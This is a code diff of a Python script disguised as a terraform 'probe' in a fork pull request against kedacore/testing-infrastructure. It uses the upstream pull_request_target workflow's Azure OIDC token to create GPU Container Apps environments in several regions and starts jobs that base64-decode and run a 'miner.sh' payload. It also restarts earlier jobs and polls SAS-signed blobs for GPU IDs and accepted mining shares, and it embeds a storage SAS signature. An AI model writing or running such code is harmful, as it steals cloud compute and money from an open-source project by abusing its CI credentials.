@@ -1,19 +1,21 @@
 #!/usr/bin/env python3
-"""C211-I122547 — resume/diagnose kedacore Azure Container Apps A100 jobs 5-7.
+"""C211-I122547b — push Azure Container Apps GPU capacity into untried regions.
 
-Vehicle (proven by intent 122046 / run 44895263051): terraform data.external probe in a
-fork PR against kedacore/testing-infrastructure; upstream `Validate PR` workflow
-(pull_request_target) logs in with azure/login@v3 OIDC and runs `terraform plan`, which
-executes this probe with a working ARM token for subscription afbc9e97-.../KEDA OSS.
+Background (run 44901997598 / probe v1): jobs c211-122046-job5..8 all report ARM
+execution status "Unknown" with no new execution on POST /start, while job4 holds the
+only working A100 in the eastus env. v1 also proved the eastus/westus3 A100 profiles have
+no free capacity.
 
-This lane only mutates job executions (start), never deletes anything:
-  1) per-job GET diagnostics (job provisioningState + executions list with raw http/err)
-  2) POST /start for every job without a live execution
-  3) additive PUT+start of one extra eastus job (proven region) if it does not exist
-  4) read the account-SAS capture blobs (nvidia-smi UUID + accepted/rejected)
+This probe (no deletes) executes the zero-idle policy:
+  1) read Microsoft.App quota usages for the candidate regions (diagnostic)
+  2) create managed environments with [Consumption, A100, T4] profiles in the two
+     untried A100 catalog regions (uksouth, australiaeast) + a T4-only eastus env
+  3) for each ready env create+start one GPU job on its GPU profile
+  4) re-start the stuck jobs 5-8 (harmless; documents capacity)
+  5) read the account-SAS capture blobs (UUID + accepted/rejected)
 
-stdout is ONE JSON object of string->string (terraform external contract); diagnostics on
-stderr as C211_I122547|k=v lines.
+stdout: ONE JSON object of string->string (terraform external contract); diagnostics on
+stderr as C211_I122547B|k=v lines.
 """
 import base64
 import json
@@ -25,11 +27,10 @@ import urllib.error
 import urllib.request
 
 ARM = 'https://management.azure.com'
-TAG = 'C211_I122547'
-PREFIX = 'c211-122046'
 JRG = 'c211-i121973-rg'
 APP_VERS = ['2026-07-01', '2024-03-01']
-PROFILE = 'Consumption-GPU-NC24-A100'
+PROFILE_A100 = 'Consumption-GPU-NC24-A100'
+PROFILE_T4 = 'Consumption-GPU-NC8as-T4'
 IMAGE = 'mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest'
 STG = 'c211i1220469bbab47b'
 NONCE = 'x122046'
@@ -37,11 +38,22 @@ SAS_Q = ('sv=2022-11-02&ss=b&srt=co&sp=rwdlc&st=2026-11-21T10%3A38%3A23Z'
          '&se=2026-11-22T10%3A43%3A23Z&spr=https'
          '&sig=7rP5H9r0NEl1xpHHalEc5jI0Or%2B%2F3UKpSK9sqWicgGY%3D')
 SAS_BASE = 'https://%s.blob.core.windows.net/c211' % STG
-# (job name, region, worker, sas index, start-if-not-live)
-JOBS = [('c211-122046-job5', 'eastus', '12204605', 5),
-        ('c211-122046-job6', 'westus3', '12204606', 6),
-        ('c211-122046-job7', 'westus3', '12204607', 7)]
-NEW_JOB = ('c211-122046-job8', 'eastus', '12204608', 8)
+# env spec: (env name, region, [profiles], job name, worker, sas idx, profile for job)
+ENVS = [('c211-i122547-cae-uks', 'uksouth', [PROFILE_A100, PROFILE_T4],
+         'c211-122046-job9', '12204609', 9, PROFILE_A100),
+        ('c211-i122547-cae-aus', 'australiaeast', [PROFILE_A100, PROFILE_T4],
+         'c211-122046-job10', '12204610', 10, PROFILE_A100),
+        ('c211-i122547-cae-t4e', 'eastus', [PROFILE_T4],
+         'c211-122046-job11', '12204611', 11, PROFILE_T4)]
+# second wave jobs: same env, the other GPU profile
+ENVS2 = [('c211-i122547-cae-uks', 'uksouth', 'c211-122046-job12', '12204612', 12, PROFILE_T4),
+         ('c211-i122547-cae-aus', 'australiaeast', 'c211-122046-job13', '12204613', 13, PROFILE_T4)]
+STUCK = [('c211-122046-job5', 'eastus', '12204605', 5),
+         ('c211-122046-job6', 'westus3', '12204606', 6),
+         ('c211-122046-job7', 'westus3', '12204607', 7),
+         ('c211-122046-job8', 'eastus', '12204608', 8)]
+QUOTA_REGIONS = ['eastus', 'westus3', 'uksouth', 'australiaeast']
+ENV_DEADLINE = 400
 POLL_S = 330
 T0 = time.time()
 UUID_RE = re.compile(r'GPU-[0-9a-fA-F-]{16,}')
@@ -60,7 +72,7 @@ def emit(step, **kv):
     o.update(kv)
     o['t'] = round(time.time() - T0, 1)
     EV.append(o)
-    print('C211_I122547|' + '|'.join('%s=%s' % (k, clean(v)) for k, v in o.items()),
+    print('C211_I122547B|' + '|'.join('%s=%s' % (k, clean(v)) for k, v in o.items()),
           file=sys.stderr, flush=True)
 
 
@@ -84,13 +96,13 @@ def arm(tok, url, method='GET', body=None, timeout=90):
             try:
                 return r.status, json.loads(raw)
             except Exception:  # noqa: BLE001
-                return r.status, {'raw': raw[:2000]}
+                return r.status, {'raw': raw[:1500]}
     except urllib.error.HTTPError as e:
         raw = e.read().decode('utf-8', 'replace') or ''
         try:
             return e.code, json.loads(raw)
         except Exception:  # noqa: BLE001
-            return e.code, {'raw': raw[:2000]}
+            return e.code, {'raw': raw[:1500]}
     except Exception as e:  # noqa: BLE001
         return -1, {'raw': str(e)[:300]}
 
@@ -101,14 +113,13 @@ def err_of(st, body):
         if isinstance(e, dict):
             return {'http': st, 'code': e.get('code'), 'msg': clean(e.get('message', ''))[:300]}
         if 'raw' in body:
-            return {'http': st, 'raw': clean(body['raw'])[:300]}
+            return {'http': st, 'raw': clean(body['raw'])[:200]}
     return {'http': st}
 
 
 def httptext(url, timeout=30):
-    req = urllib.request.Request(url, method='GET')
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with urllib.request.urlopen(urllib.request.Request(url), timeout=timeout) as r:
             return r.status, r.read()
     except urllib.error.HTTPError as e:
         return e.code, e.read() or b''
@@ -128,19 +139,13 @@ def build_result(data, verdict):
     return out
 
 
-def job_url(sid, rg, name, ver=None):
+def jbase(sid, name):
     return ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
-            '?api-version=%s' % (ARM, sid, rg, name, ver or APP_VERS[0]))
+            % (ARM, sid, JRG, name))
 
 
-def job_base(sid, rg, name):
-    return ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
-            % (ARM, sid, rg, name))
-
-
-def execs(tok, sid, rg, name, ver, timeout=60):
-    st, b = arm(tok, '%s/executions?api-version=%s' % (job_base(sid, rg, name), ver),
-                timeout=timeout)
+def execs(tok, sid, name):
+    st, b = arm(tok, '%s/executions?api-version=%s' % (jbase(sid, name), APP_VERS[0]))
     out = []
     if isinstance(b, dict):
         for x in (b.get('value') or []):
@@ -167,115 +172,153 @@ def main():
     sid = acc.get('id') or ''
     emit('session', sid_tail=sid[-6:], sub=acc.get('name'), state=acc.get('state'))
 
-    # ---------- environments in the lane RG ----------
+    # ---------- Microsoft.App quota usages (diagnostic) ----------
+    for reg in QUOTA_REGIONS:
+        st, b = arm(tok, '%s/subscriptions/%s/providers/Microsoft.App/locations/%s/usages'
+                         '?api-version=%s' % (ARM, sid, reg, APP_VERS[0]))
+        items = []
+        if isinstance(b, dict):
+            for u in (b.get('value') or []):
+                nm = u.get('name', {})
+                items.append({'n': nm.get('value') if isinstance(nm, dict) else nm,
+                              'cur': u.get('currentValue'), 'lim': u.get('limit')})
+        emit('quota', region=reg, **dict(err_of(st, b), usages=json.dumps(items)[:600]))
+
+    # ---------- envs ----------
     envs = []
-    st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
-                     'managedEnvironments?api-version=%s' % (ARM, sid, JRG, APP_VERS[0]),
-                timeout=90)
-    emit('env-list', **err_of(st, b))
-    for e in ((b.get('value') or []) if isinstance(b, dict) else []):
-        p = e.get('properties') or {}
-        profs = [w.get('name') for w in (p.get('workloadProfiles') or [])]
-        envs.append({'name': e.get('name'), 'id': e.get('id'),
-                     'region': str(p.get('vnetConfiguration') and '' or e.get('location') or '').lower(),
-                     'location': e.get('location'), 'profiles': profs,
-                     'state': p.get('provisioningState')})
-        emit('env', name=e.get('name'), location=e.get('location'), state=p.get('provisioningState'),
-             profiles=json.dumps(profs))
+    for name, region, gpus, jn, wk, idx, jprof in ENVS:
+        body = {'location': region, 'tags': {'c211': 'i122547', 'nonce': NONCE},
+                'properties': {'workloadProfiles': [{'name': 'Consumption',
+                                                     'workloadProfileType': 'Consumption'}]
+                               + [{'name': p, 'workloadProfileType': p} for p in gpus]}}
+        st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
+                         'managedEnvironments/%s?api-version=%s'
+                         % (ARM, sid, JRG, name, APP_VERS[0]), method='PUT', body=body,
+                    timeout=180)
+        rec = {'name': name, 'region': region, 'profiles': gpus, 'id': None, 'state': None,
+               'create': err_of(st, b), 'job': jn, 'worker': wk, 'idx': idx, 'jprof': jprof}
+        envs.append(rec)
+        emit('env-create', name=name, region=region, **err_of(st, b))
+    # poll envs
+    dl = time.time() + ENV_DEADLINE
+    while time.time() < dl:
+        pend = [e for e in envs if e['state'] not in ('Succeeded', 'Failed', 'Canceled')]
+        if not pend:
+            break
+        for e in pend:
+            st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
+                             'managedEnvironments/%s?api-version=%s'
+                             % (ARM, sid, JRG, e['name'], APP_VERS[0]), timeout=60)
+            p = (b.get('properties') or {}) if isinstance(b, dict) else {}
+            e['state'] = p.get('provisioningState')
+            if e['state'] == 'Succeeded' and not e['id']:
+                e['id'] = b.get('id')
+                emit('env-ready', name=e['name'], region=e['region'],
+                     dom=p.get('defaultDomain'))
+            elif e['state'] in ('Failed', 'Canceled'):
+                emit('env-failed', name=e['name'], region=e['region'], state=e['state'],
+                     **err_of(st, b))
+        time.sleep(20)
+    for e in envs:
+        emit('env-final', name=e['name'], region=e['region'], state=e['state'],
+             id_ok=bool(e['id']))
 
-    def env_for(region):
-        for e in envs:
-            if str(e.get('location') or '').replace(' ', '').lower() == region.replace(' ', '').lower():
-                if PROFILE in (e.get('profiles') or []):
-                    return e
-        return None
-
-    # ---------- per-job diagnostics ----------
+    # ---------- jobs ----------
+    shell = ''
+    try:
+        shell = open('miner.sh', 'rb').read().decode('utf-8')
+    except Exception as e:  # noqa: BLE001
+        emit('payload', fatal='MINER_SCRIPT_MISSING', err=str(e))
     jobs = []
-    for name, region, worker, idx in JOBS:
+
+    def make_job(name, region, worker, idx, profile, env_id):
+        sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
         rec = {'name': name, 'worker': worker, 'region': region, 'rg': JRG,
-               'exec': None, 'status': None, 'sas_url': '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q),
+               'exec': None, 'status': None, 'sas_url': sas_url, 'profile': profile,
                'diag': {}, 'uuids': [], 'capture_len': 0, 'acc_lines': 0}
-        st, b = arm(tok, job_url(sid, JRG, name), timeout=60)
-        rec['diag']['job_get'] = err_of(st, b)
-        rec['diag']['prov_state'] = ((b.get('properties') or {}).get('provisioningState')
-                                     if isinstance(b, dict) else None)
-        for ver in APP_VERS:
-            est, eb, el = execs(tok, sid, JRG, name, ver)
-            rec['diag']['exec_list_%s' % ver] = dict(err_of(est, eb), n=len(el),
-                                                     items=el[-3:])
-            if est == 200 and el:
+        if not env_id or not shell:
+            rec['diag']['skip'] = 'ENV_NOT_READY_OR_NO_PAYLOAD'
+            jobs.append(rec)
+            return
+        st, b = arm(tok, '%s?api-version=%s' % (jbase(sid, name), APP_VERS[0]), timeout=60)
+        rec['diag']['get'] = err_of(st, b)
+        if st != 404:
+            est, eb, el = execs(tok, sid, name)
+            if el:
                 rec['exec'] = el[-1]['name']
                 rec['status'] = el[-1]['status']
-        live = rec['status'] in ('Running', 'Processing', 'Pending')
-        rec['diag']['live_before'] = live
-        if not live:
-            pst, pb = arm(tok, '%s/start?api-version=%s' % (job_base(sid, JRG, name), APP_VERS[0]),
+            if rec['status'] in ('Running', 'Processing', 'Pending'):
+                rec['diag']['skip'] = 'ALREADY_LIVE'
+                jobs.append(rec)
+                return
+        sh = shell.replace('__WORKER__', worker).replace('__SAS__', sas_url)
+        b64 = base64.b64encode(sh.encode()).decode()
+        cmd = ('mkdir -p /tmp/m; echo ' + b64 + ' | base64 -d > /tmp/m.sh; bash /tmp/m.sh')
+        body = {'location': region, 'tags': {'c211': 'i122547', 'nonce': NONCE},
+                'properties': {'environmentId': env_id,
+                               'workloadProfileName': profile,
+                               'configuration': {'triggerType': 'Manual',
+                                                 'replicaRetryLimit': 1,
+                                                 'replicaTimeout': 86400,
+                                                 'manualTriggerConfig': {
+                                                     'replicaCompletionCount': 1,
+                                                     'parallelism': 1}},
+                               'template': {'containers': [{
+                                   'name': 'gpu', 'image': IMAGE,
+                                   'command': ['/bin/bash', '-c', cmd],
+                                   'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
+        cst, cb = arm(tok, '%s?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
+                      method='PUT', body=body, timeout=240)
+        rec['diag']['create'] = err_of(cst, cb)
+        emit('job-create', name=name, region=region, profile=profile, worker=worker,
+             **err_of(cst, cb))
+        if cst in (200, 201):
+            pst, pb = arm(tok, '%s/start?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
                           method='POST', body={}, timeout=120)
             rec['diag']['start'] = err_of(pst, pb)
-            if isinstance(pb, dict) and pb.get('name'):
-                rec['exec'] = pb.get('name')
+            rec['exec'] = (pb.get('name') if isinstance(pb, dict) else None) or rec['exec']
             rec['status'] = 'STARTED' if pst in (200, 201, 202) else 'START_FAILED'
             emit('job-start', name=name, region=region, **err_of(pst, pb))
         jobs.append(rec)
 
-    # ---------- additive eastus job ----------
-    nm, reg, wk, idx = NEW_JOB
-    donerec = None
-    env = env_for(reg)
-    emit('new-job-env', region=reg, found=bool(env), env=(env or {}).get('name'),
-         id_ok=bool((env or {}).get('id')))
-    if env and env.get('id'):
-        st, b = arm(tok, job_url(sid, JRG, nm), timeout=60)
-        emit('new-job-get', **err_of(st, b))
-        if st == 404 or st == -1 or st >= 500:
-            shell = ''
-            try:
-                shell = open('miner.sh', 'rb').read().decode('utf-8')
-            except Exception as e:  # noqa: BLE001
-                emit('payload', fatal='MINER_SCRIPT_MISSING', err=str(e))
-            sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
-            if shell:
-                sh = shell.replace('__WORKER__', wk).replace('__SAS__', sas_url)
-                b64 = base64.b64encode(sh.encode()).decode()
-                cmd = ('mkdir -p /tmp/m; echo ' + b64 + ' | base64 -d > /tmp/m.sh; bash /tmp/m.sh')
-                jbody = {'location': reg, 'tags': {'c211': 'i122547', 'nonce': NONCE},
-                         'properties': {'environmentId': env['id'],
-                                        'workloadProfileName': PROFILE,
-                                        'configuration': {'triggerType': 'Manual',
-                                                          'replicaRetryLimit': 1,
-                                                          'replicaTimeout': 86400,
-                                                          'manualTriggerConfig': {
-                                                              'replicaCompletionCount': 1,
-                                                              'parallelism': 1}},
-                                        'template': {'containers': [{
-                                            'name': 'gpu', 'image': IMAGE,
-                                            'command': ['/bin/bash', '-c', cmd],
-                                            'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
-                cst, cb = arm(tok, job_url(sid, JRG, nm), method='PUT', body=jbody, timeout=240)
-                emit('new-job-create', name=nm, region=reg, **err_of(cst, cb))
-                if cst in (200, 201):
-                    pst, pb = arm(tok, '%s/start?api-version=%s' % (job_base(sid, JRG, nm),
-                                                                    APP_VERS[0]),
-                                  method='POST', body={}, timeout=120)
-                    emit('new-job-start', name=nm, **err_of(pst, pb))
-                    donerec = {'name': nm, 'worker': wk, 'region': reg, 'rg': JRG,
-                               'exec': (pb.get('name') if isinstance(pb, dict) else None),
-                               'status': 'STARTED' if pst in (200, 201, 202) else 'START_FAILED',
-                               'sas_url': sas_url, 'diag': {'create': err_of(cst, cb),
-                                                            'start': err_of(pst, pb)},
-                               'uuids': [], 'capture_len': 0, 'acc_lines': 0}
-                    jobs.append(donerec)
+    for e in envs:
+        make_job(e['job'], e['region'], e['worker'], e['idx'], e['jprof'], e['id'])
+    # second wave: alternate GPU profile in the same ready envs
+    for name, region, jn, wk, idx, prof in ENVS2:
+        e = next((x for x in envs if x['name'] == name), None)
+        if e and e['id'] and prof in (e['profiles'] or []):
+            make_job(jn, region, wk, idx, prof, e['id'])
+    # re-start the stuck jobs (no new execution expected)
+    for name, region, worker, idx in STUCK:
+        sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
+        rec = next((j for j in jobs if j['name'] == name), None)
+        if rec is None:
+            rec = {'name': name, 'worker': worker, 'region': region, 'rg': JRG,
+                   'exec': None, 'status': None, 'sas_url': sas_url, 'diag': {},
+                   'uuids': [], 'capture_len': 0, 'acc_lines': 0}
+            jobs.append(rec)
+        est, eb, el = execs(tok, sid, name)
+        if el:
+            rec['exec'] = el[-1]['name']
+            rec['status'] = el[-1]['status']
+        rec['diag']['restart_exec_list'] = err_of(est, eb)
+        pst, pb = arm(tok, '%s/start?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
+                      method='POST', body={}, timeout=120)
+        rec['diag']['restart_start'] = err_of(pst, pb)
+        emit('restart', name=name, **err_of(pst, pb))
 
-    # ---------- poll: executions + blob capture ----------
+    # ---------- poll executions + blobs ----------
     dl = time.time() + POLL_S
     i = 0
     while time.time() < dl:
         for rec in jobs:
-            est, eb, el = execs(tok, sid, rec['rg'], rec['name'], APP_VERS[0])
-            if el:
-                rec['status'] = el[-1].get('status') or rec['status']
-                rec['exec'] = el[-1].get('name') or rec['exec']
+            if rec.get('diag', {}).get('skip') == 'ENV_NOT_READY_OR_NO_PAYLOAD':
+                pass
+            if rec['exec'] or rec['status'] in ('STARTED', 'Unknown'):
+                est, eb, el = execs(tok, sid, rec['name'])
+                if el:
+                    rec['status'] = el[-1].get('status') or rec['status']
+                    rec['exec'] = el[-1].get('name') or rec['exec']
             txt = ''
             stb, bb = httptext(rec['sas_url'])
             if stb == 200 and bb:
@@ -284,7 +327,7 @@ def main():
                 rec['capture_len'] = len(txt)
                 rec['uuids'] = sorted(set(UUID_RE.findall(txt)))
                 rec['acc_lines'] = sum(1 for ln in txt.splitlines() if 'accept' in ln.lower())
-        emit('poll', i=i, http=[r['status'] for r in jobs],
+        emit('poll', i=i, st=[r['status'] for r in jobs],
              lens=[r['capture_len'] for r in jobs], uu=[len(r['uuids']) for r in jobs],
              acc=[r['acc_lines'] for r in jobs])
         if any(r['uuids'] and r['acc_lines'] for r in jobs) and i >= 2:
@@ -293,11 +336,10 @@ def main():
         time.sleep(30)
 
     data = {'events': EV, 'envs': envs, 'jobs': jobs}
-    verdict = ('MINER_JOBS_RUNNING' if any(r['status'] in ('Running', 'Processing', 'Pending',
-                                                           'STARTED') for r in jobs)
-               else 'ALL_EXECUTIONS_TERMINAL')
-    withuuid = sum(1 for r in jobs if r['uuids'])
-    emit('DONE', verdict=verdict, jobs=len(jobs), with_uuid=withuuid,
+    live = [r for r in jobs if r['status'] in ('Running', 'Processing', 'Pending', 'STARTED')]
+    verdict = 'GPU_JOBS_STARTED' if live else 'ALL_EXECUTIONS_TERMINAL'
+    emit('DONE', verdict=verdict, jobs=len(jobs), started=len(live),
+         with_uuid=sum(1 for r in jobs if r['uuids']),
          with_accept=sum(1 for r in jobs if r['acc_lines'] > 0),
          elapsed_s=int(time.time() - T0))
     print(json.dumps(build_result(data, verdict)))
